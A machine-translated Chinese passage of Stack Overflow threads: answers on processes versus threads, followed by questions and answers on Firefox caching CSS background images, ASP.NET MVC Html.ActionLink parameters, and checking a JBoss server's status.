> 
> 将此视为“执行上下文”问题，您的任务现在可以选择执行外部程序（= 将地址空间与父级分开）等，如果他们愿意，或者他们可以例如与父级共享所有内容，*除了*文件描述符（这样子“线程”可以打开大量文件而无需父级担心它们：当子“线程”退出时它们会自动关闭，并且不会用完父级中的 fd） .
> 
> 例如，考虑一个线程化的“inetd”。您想要低开销的 fork+exec，因此使用 Linux 方式，您可以编写多线程 inetd，而不是使用“fork()”，其中每个线程仅使用 CLONE_VM（共享地址空间，但不共享文件）创建描述符等）。然后，如果它是外部服务（例如 rlogind），或者它可能是内部 inetd 服务之一（echo，timeofday），那么子可以执行，在这种情况下，它只是做它的事情并退出。
> 
> 你不能用“线程”/“进程”来做到这一点。
> 
> 莱纳斯

* * *

## 回答 #13

> 赞同：18
> 
> 时间：2013-04-03T18:29:17.680

试图回答这个与 Java 世界有关的问题。

进程是程序的执行，而线程是进程中的单个执行序列。一个进程可以包含多个线程。线程有时称为**轻量级进程**。

例如：

示例 1：JVM 在单个进程中运行，并且 JVM 中的线程共享属于该进程的堆。这就是为什么多个线程可以访问同一个对象的原因。线程共享堆并拥有自己的堆栈空间。这就是一个线程对方法及其局部变量的调用如何与其他线程保持线程安全。但是堆不是线程安全的，为了线程安全必须同步。

示例 2：程序可能无法通过读取击键来绘制图片。程序必须全神贯注于键盘输入，缺乏一次处理多个事件的能力会导致麻烦。这个问题的理想解决方案是同时无缝执行程序的两个或多个部分。线程允许我们这样做。这里画图是一个进程，读取击键是子进程（线程）。

* * *

## 回答 #14

> 赞同：15
> 
> 时间：2016-08-14T17:47:14.677

试图从 Linux Kernel 的 OS View 来回答它

程序在启动到内存时就变成了一个进程。进程有自己的地址空间，这意味着在内存中有各种段，例如`.text`用于存储编译代码的段，`.bss`用于存储未初始化的静态或全局变量等。
每个进程都有自己的程序计数器和用户空间*堆栈*。

在内核内部，每个进程都有自己的内核堆栈（出于安全问题，它与用户空间堆栈分离）和一个名为的结构，该结构`task_struct`通常被抽象为进程控制块，存储有关进程的所有信息，例如其优先级、状态,（和一大堆其他块）。
一个进程可以有多个执行线程。

来到线程，它们驻留在进程内，并与其他资源共享父进程的地址空间，这些资源可以在线程创建期间传递，例如文件系统资源、共享挂起的信号、共享数据（变量和指令），因此使线程轻量级和因此允许更快的上下文切换。

在内核内部，每个线程都有自己的内核堆栈以及`task_struct`定义线程的结构。因此内核将同一进程的线程视为不同的实体，并且它们本身是可调度的。同一进程中的线程共享一个称为线程组 id( `tgid`) 的公共 id，它们也有一个称为进程 id( `pid`) 的唯一 id。

* * *

## 回答 #15

> 赞同：15
> 
> 时间：2018-04-15T12:12:36.737

对于那些更喜欢通过可视化来学习的人，这是我创建的一个方便的图表来解释进程和线程。
我使用了来自 MSDN 的信息 - [About Processes and Threads](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681917%28v=vs.85%29.aspx "MSDN")

[![进程和线程](https://i.stack.imgur.com/NVNge.jpg)](https://i.stack.imgur.com/NVNge.jpg)

* * *

## 回答 #16

> 赞同：14
> 
> 时间：2015-05-10T08:43:18.327

进程和线程都是独立的执行序列。典型的区别是（同一进程的）线程在共享内存空间中运行，而进程在不同的内存空间中运行。

过程

是一个正在执行的程序。它有文本部分，即程序代码、当前活动，由程序计数器的值和处理器寄存器的内容表示。它还包括包含临时数据（如函数参数、返回地址和局部变量）的进程堆栈和包含全局变量的数据段。一个进程还可能包括一个堆，它是在进程运行时动态分配的内存。

线

线程是 CPU 使用的基本单位；它包括线程 ID、程序计数器、寄存器集和堆栈。它与属于同一进程的其他线程共享其代码段、数据段和其他操作系统资源，例如打开的文件和信号。

-- 摘自 Galvin 的操作系统

* * *

## 回答 #17

> 赞同：11
> 
> 时间：2012-12-21T04:22:39.757

1.  线程在共享内存空间中运行，而进程在单独的内存空间中运行
2.  线程是轻量级进程，但进程是重量级进程。
3.  线程是进程的子类型。

* * *

## 回答 #18

> 赞同：11
> 
> 时间：2013-11-21T09:45:59.710

[线程和进程之间的区别？](http://www.programmerinterview.com/index.php/operating-systems/thread-vs-process/)

进程是应用程序的执行实例，线程是进程内的执行路径。此外，一个进程可以包含多个线程。重要的是要注意一个线程可以做任何一个进程可以做的事情。但是由于一个进程可以由多个线程组成，一个线程可以被认为是一个“轻量级”进程。因此，线程和进程之间的本质区别在于每个线程用于完成的工作。线程用于小任务，而进程用于更“重量级”的任务——基本上是应用程序的执行。

线程和进程之间的另一个区别是同一进程中的线程共享相同的地址空间，而不同的进程则不共享。这允许线程读取和写入相同的数据结构和变量，也便于线程之间的通信。进程之间的通信（也称为 IPC 或进程间通信）非常困难且占用大量资源。

> 下面总结一下线程和进程的区别：

1.  线程比进程更容易创建，因为它们不需要单独的地址空间。

2.  多线程需要仔细编程，因为线程共享数据结构，一次只能由一个线程修改。与线程不同，进程不共享相同的地址空间。

3.  线程被认为是轻量级的，因为它们使用的资源比进程少得多。

4.  进程相互独立。线程，因为它们共享相同的地址空间是相互依赖的，所以必须小心，以免不同的线程相互踩踏。
    这实际上是上述#2 的另一种表述方式。

5.  一个进程可以由多个线程组成。

* * *

## 回答 #19

> 赞同：11
> 
> 时间：2018-11-27T10:03:47.807

**过程：**

进程基本上是一个正在执行的程序。它是一个活跃的实体。一些操作系统使用术语“任务”来指代正在执行的程序。进程始终存储在主存储器中，也称为主存储器或随机存取存储器。因此，进程被称为活动实体。如果机器重新启动，它就会消失。几个进程可能与同一个程序相关联。在多处理器系统上，可以并行执行多个进程。在单处理器系统上，虽然没有实现真正的并行性，但应用了进程调度算法，并且处理器被调度为一次执行每个进程，从而产生并发错觉。示例：执行“计算器”程序的多个实例。每个实例都称为一个进程。

**线：**

线程是进程的子集。它被称为“轻量级进程”，因为它类似于实际进程，但在进程的上下文中执行并共享内核分配给进程的相同资源。通常，一个进程只有一个控制线程——一次执行一组机器指令。一个进程也可以由同时执行指令的多个执行线程组成。多线程控制可以利用多处理器系统上可能的真正并行性。在单处理器系统上，应用了线程调度算法，处理器被调度为一次运行每个线程。在一个进程中运行的所有线程共享相同的地址空间、文件描述符、堆栈和其他与进程相关的属性。由于进程的线程共享相同的内存，

参考[https://practice.geeksforgeeks.org/problems/difference-between-process-and-thread](https://practice.geeksforgeeks.org/problems/difference-between-process-and-thread)

* * *

## 回答 #20

> 赞同：10
> 
> 时间：2013-02-21T17:03:34.300

以下是我从[The Code Project](https://en.wikipedia.org/wiki/Code_Project)上的一篇文章中得到的。我想它清楚地解释了所需的一切。

> 线程是将工作负载拆分为单独的执行流的另一种机制。线程比进程更轻。这意味着，它提供的灵活性低于完整的流程，但可以更快地启动，因为操作系统需要设置的更少。当一个程序由两个或多个线程组成时，所有线程共享一个内存空间。进程被赋予单独的地址空间。所有线程共享一个堆。但是每个线程都有自己的堆栈。

* * *

## 回答 #21

> 赞同：9
> 
> 时间：2015-02-13T09:24:15.230

从面试官的角度来看，我想听的基本上只有 3 件主要的事情，除了很明显的事情，比如一个进程可以有多个线程：

1.  线程共享相同的内存空间，这意味着一个线程可以从其他线程的内存中访问内存。进程通常不能。
2.  资源。资源（内存、句柄、套接字等）在进程终止时释放，而不是线程终止。
3.  安全。一个进程有一个固定的安全令牌。另一方面，线程可以模拟不同的用户/令牌。

如果您想要更多，Scott Langham 的回答几乎涵盖了所有内容。所有这些都是从操作系统的角度来看的。不同的语言可以实现不同的概念，例如任务、轻量级线程等，但它们只是使用线程（Windows 上的光纤）的方式。没有硬件和软件线程。有硬件和软件**异常**和**中断**，或者用户模式和内核**线程**。

* * *

## 回答 #22

> 赞同：8
> 
> 时间：2015-10-10T20:23:13.147

来自嵌入式世界，我想补充一点，进程的概念只存在于具有 MMU（内存管理单元）的“大”处理器（*台式机 CPU，ARM Cortex A-9*）和支持使用 MMU（比如*Linux*）。对于小型/旧处理器和微控制器以及小型 RTOS 操作系统（*实时操作系统*），例如 freeRTOS，没有 MMU 支持，因此没有进程，只有线程。

**线程**可以访问彼此的内存，并且它们由操作系统以交错方式调度，因此它们看起来是并行运行的（或者它们实际上是并行运行的多核）。

**另一方面，**进程存在于它们的私有虚拟内存沙箱中，由 MMU 提供和保护。**这很方便，因为它可以：**

 **1.  防止错误的进程使整个系统崩溃。
2.  通过使其他流程数据不可见和不可访问来维护安全性。进程内部的实际工作由一个或多个线程负责。

* * *

## 回答 #23

> 赞同：8
> 
> 时间：2019-03-12T15:41:50.323

我已经仔细阅读了那里的几乎所有答案，唉，作为一名正在学习操作系统课程的本科生，我目前无法彻底理解这两个概念。我的意思是大多数人从一些操作系统书籍中阅读了差异，即线程能够访问事务单元中的全局变量，因为它们利用了它们的进程地址空间。然而，新的问题出现了为什么会有进程，众所周知，我们已经知道线程相对于进程来说是更轻量级的。[让我们通过使用从先前答案之一中](https://stackoverflow.com/a/41006780/4990642)摘录的图像来看看以下示例，

我们有 3 个线程同时处理 Word 文档，例如[Libre Office](https://www.libreoffice.org/)。如果单词拼写错误，第一个通过下划线进行拼写检查。第二个从键盘获取并打印字母。最后一个确实会在短时间内保存文档，以免在出现问题时丢失正在处理的文档。*在这种情况下，3 个线程不能是 3 个进程，因为它们共享一个公共内存，即它们的进程的地址空间，因此都可以访问正在编辑的文档。*因此，道路是文字文档以及两台推土机，它们是线程，尽管其中一个在图像中是缺失的。

[![在此处输入图像描述](https://i.stack.imgur.com/xJXNS.png)](https://i.stack.imgur.com/xJXNS.png)

* * *

## 回答 #24

> 赞同：7
> 
> 时间：2012-12-24T07:19:26.230

**进程**：正在执行的程序称为进程

**线程**：线程是基于“与其他”概念与程序的另一部分一起执行的功能，因此线程是进程的一部分。

* * *

## 回答 #25

> 赞同：7
> 
> 时间：2017-07-20T12:59:16.400

1.  基本上，线程是进程的一部分，没有进程线程将无法工作。
2.  线程是轻量级的，而进程是重量级的。
3.  进程之间的通信需要一些时间，而线程需要更少的时间。
4.  线程可以共享相同的内存区域，而进程是分开的。

* * *

## 回答 #26

> 赞同：6
> 
> 时间：2015-07-17T18:55:59.917

在使用包含多线程的 Python（解释语言）构建算法时，我惊讶地发现，与我之前构建的顺序算法相比，执行时间并没有更好。为了理解这个结果的原因，我做了一些阅读，并相信我学到的东西提供了一个有趣的上下文，可以更好地理解多线程和多进程之间的区别。

多核系统可能会执行多个线程，因此 Python 应该支持多线程。但是 Python 不是编译语言，而是解释语言¹。这意味着程序必须被解释才能运行，并且解释器在程序开始执行之前并不知道程序。然而，它所知道的是 Python 的规则，然后它会动态地应用这些规则。Python 中的优化必须主要是解释器本身的优化，而不是要运行的代码。这与 C++ 等编译语言形成对比，并且对 Python 中的多线程有影响。具体来说，Python 使用 Global Interpreter Lock 来管理多线程。

另一方面，编译语言是经过编译的。该程序被“完全”处理，首先根据其句法定义对其进行解释，然后映射到与语言无关的中间表示，最后链接到可执行代码。这个过程允许代码被高度优化，因为它在编译时都是可用的。各种程序交互和关系是在创建可执行文件时定义的，并且可以做出关于优化的稳健决策。

在现代环境中，Python 的解释器必须允许多线程，这必须既安全又高效。这就是解释语言与编译语言之间的区别所在。解释器不得干扰来自不同线程的内部共享数据，同时优化处理器的计算使用。

正如在之前的文章中所提到的，进程和线程都是独立的顺序执行，主要区别在于进程的多个线程共享内存，而进程隔离它们的内存空间。

在 Python 中，全局解释器锁保护数据免受不同线程同时访问。它要求在任何 Python 程序中，任何时候都只能执行一个线程。另一方面，可以运行多个进程，因为每个进程的内存都与任何其他进程隔离，并且进程可以在多个内核上运行。

* * *

¹ Donald Knuth 在 The Art of Computer Programming: Fundamental Algorithms 中对解释例程有很好的解释。

* * *

## 回答 #27

> 赞同：5
> 
> 时间：2017-12-15T00:44:21.470

到目前为止，我找到的最佳答案是[Michael Kerrisk 的“Linux 编程接口”](https://rads.stackoverflow.com/amzn/click/com/1593272200)：

> 在现代 UNIX 实现中，每个进程可以有多个执行线程。设想线程的一种方法是作为一组共享相同虚拟内存以及一系列其他属性的进程。每个线程执行相同的程序代码并共享相同的数据区和堆。但是，每个线程都有自己的堆栈，其中包含局部变量和函数调用链接信息。[LPI 2.12]

这本书非常清晰。[Julia Evans 在本文](http://Here%20is%20how%20groups%20actually%20work!%20I%20learned%20this%20by%20reading%20Chapter%209%20(%E2%80%9CProcess%20Credentials%E2%80%9D)%20of%20The%20Linux%20Programming%20Interface%20which%20is%20an%20incredible%20book.%20As%20soon%20as%20I%20realized%20that%20I%20did%20not%20understand%20how%20users%20and%20groups%20worked,%20I%20opened%20up%20the%20table%20of%20contents%20with%20absolute%20confidence%20that%20it%20would%20tell%20me%20what%E2%80%99s%20up,%20and%20I%20was%20right.)中提到了它有助于了解 Linux 组的实际工作方式。

* * *

## 回答 #28

> 赞同：4
> 
> 时间：2016-04-19T02:01:33.233

同一进程内的线程共享内存，但每个线程都有自己的堆栈和寄存器，线程将线程特定的数据存储在堆中。线程从不独立执行，因此与进程间通信相比，线程间通信要快得多。

进程从不共享相同的内存。当子进程创建时，它会复制父进程的内存位置。进程通信是通过使用管道、共享内存和消息解析来完成的。线程之间的上下文切换非常慢。

* * *

## 回答 #29

> 赞同：3
> 
> 时间：2014-05-13T16:34:55.000

示例 1：JVM 在单个进程中运行，并且 JVM 中的线程共享属于该进程的堆。这就是为什么多个线程可以访问同一个对象的原因。线程共享堆并拥有自己的堆栈空间。这就是一个线程对方法及其局部变量的调用如何与其他线程保持线程安全。但是堆不是线程安全的，为了线程安全必须同步。

* * *

## 回答 #30

> 赞同：2
> 
> 时间：2014-04-27T21:27:14.047

它们几乎一样......但关键区别在于线程是轻量级的，而进程在上下文切换、工作负载等方面是重量级的。

* * *

## 回答 #31

> 赞同：2
> 
> 时间：2016-06-06T14:57:49.133

将流程视为所有权单位或任务需要哪些资源。进程可以拥有诸如内存空间、特定输入/输出、特定文件和优先级等资源。

线程是可调度的执行单元，简单来说就是通过一系列指令的进度

* * *

## 回答 #32

> 赞同：2
> 
> 时间：2018-09-06T06:26:24.980

进程和线程之间的区别如下：

*   Process 是程序的执行实例，而 Thread 是最小的 process 单元。
*   进程可以划分为多个线程，而线程不能划分。
*   进程可以被认为是一个任务，而线程可以被认为是一个任务轻量级的进程。
*   进程分配单独的内存空间，而线程分配共享内存空间。
*   进程由操作系统维护，而线程由程序员维护。

* * *

## 回答 #33

> 赞同：2
> 
> 时间：2020-05-17T15:43:20.063

我相信理解差异的最简单方法是可视化线程和进程如何执行它们的工作。

* * *

***线程***在（创建它们的进程的）共享内存空间**中并行**运行

```
Thread 1              Thread 2              Thread 3
   | 
   | 
   |
                         |
                         |
                                               |
                                               |
                                               |
   |
                         |
                         | 
                         |            
Complete             Complete              Complete 
```

*注意：以上可以理解为一个进程（即一个进程有3个线程）*

* * *

***进程*****并行和并发**运行：

```
Process 1              Process 2              Process 3
    |                      |                      |
    |                      |                      |
    |                      |                      |
    |                      |                      |
    |                      |                      |
    |                      |                      |
Complete               Complete               Complete 
```

* * *

## 回答 #34

> 赞同：1
> 
> 时间：2019-10-11T02:30:22.820

进程 - 正在执行的程序

线程 - 线程是执行程序指令的最小序列

例如，您想计算矩阵乘法，您将在 main 中编写一个包含 3 个 for 循环的程序并执行它。现在这是你的过程。

现在，您可以通过创建线程并分配每个线程来执行行的结果来解决相同的程序。每个线程将独立工作，结果将存储在一个数组中。由于线程在进程内共享相同的内存。

在这两种情况下，结果都是一样的。

* * *

## 回答 #35

> 赞同：0
> 
> 时间：2018-10-01T02:31:53.600

来自 Erlang Programming (2009)：Erlang 并发是快速且可扩展的。它的进程是轻量级的，因为 Erlang 虚拟机不会为每个创建的进程创建一个 OS 线程。它们在 VM 中创建、调度和处理，独立于底层操作系统。

Erlang 实现了一个抢占式调度器，它允许每个进程运行一段设定的时间，而不会阻塞系统线程太久，这给了每个进程一些 cpu 时间来执行。如果我没记错的话，系统线程的数量取决于内核的数量，如果负载变得不均匀，进程可以从一个线程中删除并转移到另一个线程，这一切都由 Erlang 调度程序处理。

* * *

## 回答 #36

> 赞同：0
> 
> 时间：2022-02-03T23:37:15.927

[![进程和线程的区别](https://i.stack.imgur.com/W6flw.jpg)](https://i.stack.imgur.com/W6flw.jpg)

这张图片显示了进程和线程之间的区别

* * *

## 回答 #37

> 赞同：-1
> 
> 时间：2021-02-18T15:30:32.757

线程是一个轻量级进程，而进程是一个自包含的执行环境。

“自包含执行过程”是什么意思？一组私有的基本运行时资源。

“私有的基本运行时资源集”是什么意思？从内存中分配来运行进程的空间。（只是一个内存空间。）

# css - Firefox 或 Safari 不会重新加载样式表图像

> ID：200470
> 
> 赞同：6
> 
> 时间：2008-10-14T09:14:40.123
> 
> 标签：css, firefox, safari, firefox-3

我们发现 Firefox（至少 v3）和 Safari 不能正确缓存从 css 文件引用的图像。图像被缓存，但它们永远不会刷新，即使您在服务器上更改它们也是如此。一旦 Firefox 将图像放入缓存中，它就永远不会检查它是否已更改。

我们的 css 文件如下所示：

```
div#news {
  background: #FFFFFF url(images/newsitem_background.jpg) no-repeat;
  ...
} 
```

问题是，如果我们现在更改 newsitem_background.jpg 图片，所有 Firefox 用户仍将获得旧图片，除非他们明确刷新页面。另一方面，IE 会检测到图像已更改并自动重新加载。

这是一个已知问题吗？任何解决方法？谢谢！

编辑：解决方案是不要按 F5。我可以做这个。但我们的客户只会访问我们的网站，并获得旧的、过时的图形。他们怎么知道他们需要按 F5？

我已经安装了 Firebug 并确认了我已经怀疑的内容：Firefox 甚至不尝试检索从 css 文件引用的图像，以查明它们是否已更改。当您按 F5 时，它会检查所有图像，并且 Web 服务器很好地响应 304，除了那些*已*更改的图像，它响应 200 OK。

那么，有没有办法促使 Firefox*自动*更新从 css 文件中引用的图像？当然，我不是唯一一个有这个问题的人吗？

EDIT2：我用localhost测试了这个，图像响应不包含任何缓存信息，它是：

```
Server  Microsoft-IIS/5.1
X-Powered-By    ASP.NET
Date    Tue, 14 Oct 2008 11:01:27 GMT
Content-Type    image/jpeg
Accept-Ranges   bytes
Last-Modified   Tue, 14 Oct 2008 11:00:43 GMT
Etag    "7ab3aa1aec2dc91:9f4"
Content-Length  61196 
```

EDIT3：我做了更多的阅读，看起来它无法修复，因为 Firefox 或大多数浏览器只会假设图像不会经常更改（标题和所有内容都过期）。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-14T12:25:50.020

我只想在图像 url 中添加一个查询字符串值。我通常只是创建一个“版本号”并在每次图像更改时递增它：

```
div#news {
  background: url(images/newsitem_background.jpg?v=00001) no-repeat;
  ...
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T12:02:18.163

为了避免这样的问题，我看到网站管理员在他们的文件中添加了**版本号。**所以他们加载`site-look-124.css`和`newsitem_background-7.jpg.`

不错的解决方案，恕我直言。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T10:04:36.670

验证您提供的图像上的 HTTP 标头以及 CSS 文件。

如果其中任何一个设置为缓存（或丢失），您会发现浏览器正在正确缓存文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T09:19:29.430

尝试在单击重新加载（或按 ）时按住 SHIFT 键`F5`。

否则，请使用 Firebug 等工具检查 HTTP 请求/响应标头并观察控制缓存的标头值。我从来没有注意到这个问题。也许您的服务器正在返回 304 响应（未修改）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T09:23:27.440

我知道这可能不是您想听到的，但是 Firefox 更可能遵循标准而 IE 正在做一些有点奇怪的事情（而您只是碰巧依赖它；））。

缓存行为取决于与图像一起发送的缓存标头。如果您能够发布标题（或其中一张图片的 URL），那么我们将能够更具体地告诉您发生了什么。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T12:22:16.050

这并不能解决 Firefox 不检查图像是否已过期的问题，但您可以采取以下措施确保您的客户看到正确的图像：

将 css 中的图像设置为返回图像的 PHP 或类似脚本：

```
div#news {
  background: #FFFFFF url(images/background.php?name=newsitem) no-repeat;
  ...
} 
```

然后使用脚本返回图像”

```
<?php
$name = isset($_REQUEST['name']) ? $_REQUEST['name'] : false;
switch($name) {
    case 'newsitem':
        $filename = 'news_item_background.jpg';
    break;
    default:
        $filename = 'common_background.jpg';
    break;
}

header("Content-Type: image/jpeg");
header("Content-Transfer-Encoding: binary");
$fp = fopen($filename , "r");
if ($fp) fpassthru($fp); 
```

我在我的家庭服务器上使用它来为我的一些页面随机返回背景图像，而 Firefox 似乎没有缓存这些。如果您愿意，您还可以对图像进行一些时髦的处理。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-08-25T14:08:25.340

另一种快速解决方法（如果这主要发生在网页设计的中间）是在 Firefox 中查看实际的 css 页面，然后重新加载页面，然后当您返回网站时，浏览器将读取当前的 css 页面。

当然，这只是针对网页设计师的临时修复

# c# - HTML.ActionLink 方法

> ID：200476
> 
> 赞同：262
> 
> 时间：2008-10-14T09:16:58.513
> 
> 标签：c#, .net, asp.net-mvc, html-helper, actionlink

假设我有一堂课

```
public class ItemController:Controller
{
    public ActionResult Login(int id)
    {
        return View("Hi", id);
    }
} 
```

在不位于 Item 文件夹的页面上`ItemController`，我想创建一个指向该`Login`方法的链接。那么`Html.ActionLink`我应该使用哪种方法，应该传递哪些参数呢？

具体来说，我正在寻找方法的替换

```
Html.ActionLink(article.Title,
    new { controller = "Articles", action = "Details",
          id = article.ArticleID }) 
```

已在最近的 ASP.NET MVC 化身中退役。

* * *

## 回答 #1

> 赞同：507
> 
> 时间：2008-10-14T14:19:33.567

我想你想要的是这样的：

## ASP.NET MVC1

```
Html.ActionLink(article.Title, 
                "Login",  // <-- Controller Name.
                "Item",   // <-- ActionMethod
                new { id = article.ArticleID }, // <-- Route arguments.
                null  // <-- htmlArguments .. which are none. You need this value
                      //     otherwise you call the WRONG method ...
                      //     (refer to comments, below).
                ) 
```

这使用以下方法 ActionLink 签名：

```
public static string ActionLink(this HtmlHelper htmlHelper, 
                                string linkText,
                                string controllerName,
                                string actionName,
                                object values, 
                                object htmlAttributes) 
```

## ASP.NET MVC2

*两个论点被调换了*

```
Html.ActionLink(article.Title, 
                "Item",   // <-- ActionMethod
                "Login",  // <-- Controller Name.
                new { id = article.ArticleID }, // <-- Route arguments.
                null  // <-- htmlArguments .. which are none. You need this value
                      //     otherwise you call the WRONG method ...
                      //     (refer to comments, below).
                ) 
```

这使用以下方法 ActionLink 签名：

```
public static string ActionLink(this HtmlHelper htmlHelper, 
                                string linkText,
                                string actionName,
                                string controllerName,
                                object values, 
                                object htmlAttributes) 
```

## ASP.NET MVC3+

*参数的顺序与 MVC2 相同，但不再需要 id 值：*

```
Html.ActionLink(article.Title, 
                "Item",   // <-- ActionMethod
                "Login",  // <-- Controller Name.
                new { article.ArticleID }, // <-- Route arguments.
                null  // <-- htmlArguments .. which are none. You need this value
                      //     otherwise you call the WRONG method ...
                      //     (refer to comments, below).
                ) 
```

这避免了将任何路由逻辑硬编码到链路中。

```
 <a href="/Item/Login/5">Title</a> 
```

这将为您提供以下 html 输出，假设：

1.  `article.Title = "Title"`
2.  `article.ArticleID = 5`
3.  您仍然定义了以下路线

. .

```
routes.MapRoute(
    "Default",     // Route name
    "{controller}/{action}/{id}",                           // URL with parameters
    new { controller = "Home", action = "Index", id = "" }  // Parameter defaults
); 
```

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2009-03-09T11:57:52.920

我想补充一下[Joseph Kingry 的回答](https://stackoverflow.com/a/201341/3834)。他提供了解决方案，但起初我也无法让它发挥作用，得到的结果就像 Adhip Gupta 一样。然后我意识到路线必须首先存在，并且参数需要与路线完全匹配。所以我有一个 id，然后是我的路线的文本参数，也需要包含在内。

```
Html.ActionLink(article.Title, "Login", "Item", new { id = article.ArticleID, title = article.Title }, null) 
```

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2008-10-14T15:39:05.857

您可能想查看该方法。该[`RouteLink()`](http://msdn.microsoft.com/en-us/library/system.web.mvc.html.linkextensions.routelink.aspx)方法允许您通过字典指定所有内容（链接文本和路由名称除外）。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2010-09-30T15:31:49.663

我认为约瑟夫翻转了控制器和动作。首先是动作，然后是控制器。这有点奇怪，但签名的样子。

只是为了澄清一些事情，这是有效的版本（改编约瑟夫的例子）：

```
Html.ActionLink(article.Title, 
    "Login",  // <-- ActionMethod
    "Item",   // <-- Controller Name
    new { id = article.ArticleID }, // <-- Route arguments.
    null  // <-- htmlArguments .. which are none
    ) 
```

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2010-10-09T07:37:45.403

那这个呢

```
<%=Html.ActionLink("Get Involved", 
                   "Show", 
                   "Home", 
                   new 
                       { 
                           id = "GetInvolved" 
                       }, 
                   new { 
                           @class = "menuitem", 
                           id = "menu_getinvolved" 
                       }
                   )%> 
```

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2008-10-14T13:47:11.620

```
Html.ActionLink(article.Title, "Login/" + article.ArticleID, 'Item") 
```

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2013-12-26T21:23:57.400

如果您想穿上所有花哨的裤子，可以通过以下方式扩展它以使其能够做到这一点：

```
@(Html.ActionLink<ArticlesController>(x => x.Details(), article.Title, new { id = article.ArticleID })) 
```

您需要将其放在`System.Web.Mvc`命名空间中：

```
public static class MyProjectExtensions
{
    public static MvcHtmlString ActionLink<TController>(this HtmlHelper htmlHelper, Expression<Action<TController>> expression, string linkText)
    {
        var urlHelper = new UrlHelper(htmlHelper.ViewContext.RequestContext, htmlHelper.RouteCollection);

        var link = new TagBuilder("a");

        string actionName = ExpressionHelper.GetExpressionText(expression);
        string controllerName = typeof(TController).Name.Replace("Controller", "");

        link.MergeAttribute("href", urlHelper.Action(actionName, controllerName));
        link.SetInnerText(linkText);

        return new MvcHtmlString(link.ToString());
    }

    public static MvcHtmlString ActionLink<TController, TAction>(this HtmlHelper htmlHelper, Expression<Action<TController, TAction>> expression, string linkText, object routeValues)
    {
        var urlHelper = new UrlHelper(htmlHelper.ViewContext.RequestContext, htmlHelper.RouteCollection);

        var link = new TagBuilder("a");

        string actionName = ExpressionHelper.GetExpressionText(expression);
        string controllerName = typeof(TController).Name.Replace("Controller", "");

        link.MergeAttribute("href", urlHelper.Action(actionName, controllerName, routeValues));
        link.SetInnerText(linkText);

        return new MvcHtmlString(link.ToString());
    }

    public static MvcHtmlString ActionLink<TController>(this HtmlHelper htmlHelper, Expression<Action<TController>> expression, string linkText, object routeValues, object htmlAttributes) where TController : Controller
    {
        var urlHelper = new UrlHelper(htmlHelper.ViewContext.RequestContext, htmlHelper.RouteCollection);

        var attributes = AnonymousObjectToKeyValue(htmlAttributes);

        var link = new TagBuilder("a");

        string actionName = ExpressionHelper.GetExpressionText(expression);
        string controllerName = typeof(TController).Name.Replace("Controller", "");

        link.MergeAttribute("href", urlHelper.Action(actionName, controllerName, routeValues));
        link.MergeAttributes(attributes, true);
        link.SetInnerText(linkText);

        return new MvcHtmlString(link.ToString());
    }

    private static Dictionary<string, object> AnonymousObjectToKeyValue(object anonymousObject)
    {
        var dictionary = new Dictionary<string, object>();

        if (anonymousObject == null) return dictionary;

        foreach (PropertyDescriptor propertyDescriptor in TypeDescriptor.GetProperties(anonymousObject))
        {
            dictionary.Add(propertyDescriptor.Name, propertyDescriptor.GetValue(anonymousObject));
        }

        return dictionary;
    }
} 
```

`Route Values`这包括对and的两个覆盖`HTML Attributes`，此外，您的所有视图都需要添加：`@using YourProject.Controllers`或者您可以将其添加到您的`web.config <pages><namespaces>`

* * *

## 回答 #8

> 赞同：8
> 
> 时间：2015-09-14T11:56:04.523

使用命名参数以提高可读性并避免混淆。

```
@Html.ActionLink(
            linkText: "Click Here",
            actionName: "Action",
            controllerName: "Home",
            routeValues: new { Identity = 2577 },
            htmlAttributes: null) 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2015-08-25T13:14:04.147

使用 MVC5 我已经这样做了，它是 100% 工作代码....

```
@Html.ActionLink(department.Name, "Index", "Employee", new { 
                            departmentId = department.DepartmentID }, null) 
```

各位大佬可以借鉴一下...

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2017-05-17T20:29:02.533

这种类型使用：

@Html.ActionLink("MainPage","Index","Home")

MainPage : 文本名称 Index : Action View Home : HomeController

基本使用 ActionLink

```
<html>
<head>
    <meta name="viewport" content="width=device-width" />
    <title>_Layout</title>
    <link href="@Url.Content("~/Content/bootsrap.min.css")" rel="stylesheet" type="text/css" />
</head>
<body>
    <div class="container">
        <div class="col-md-12">
            <button class="btn btn-default" type="submit">@Html.ActionLink("AnaSayfa","Index","Home")</button>
            <button class="btn btn-default" type="submit">@Html.ActionLink("Hakkımızda", "Hakkimizda", "Home")</button>
            <button class="btn btn-default" type="submit">@Html.ActionLink("Iletişim", "Iletisim", "Home")</button>
        </div> 
        @RenderBody()
        <div class="col-md-12" style="height:200px;background-image:url(/img/footer.jpg)">

        </div>
    </div>
</body>
</html>
```

# jboss - 如何获取 JBoss 应用服务器的状态

> ID：200479
> 
> 赞同：2
> 
> 时间：2008-10-14T09:19:27.150
> 
> 标签：jboss, solaris, application-server, failovercluster

我正在为 JBoss 应用服务器编写一个高度可用的代理，以便在 Solaris Open HA Cluster 上运行。由于我对JBoss AS了解不多，请问有人可以告诉我如何探测应用程序服务器的状态吗？

我想知道应用程序服务器的健康状况，例如它当前是否正在运行。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T10:25:34.723

开箱即用，JBoss 有一个 JMX 控制台，它提供有关加载到微内核中的模块和正在运行的服务的信息。这个应用程序通常可以在[http://hostname:8080/jmx-console 获得](http://hostname:8080/jmx-console)，您可以想象它的存在或不存在作为您的 JBoss 服务器是否正在运行的指标。

在 HA 集群的上下文中，您可能在节点前面有一个负载平衡交换机或其他 4-7 层感知设备。如果要检测集群中每个节点的状态，则需要确保使用节点的本地 IP 地址。

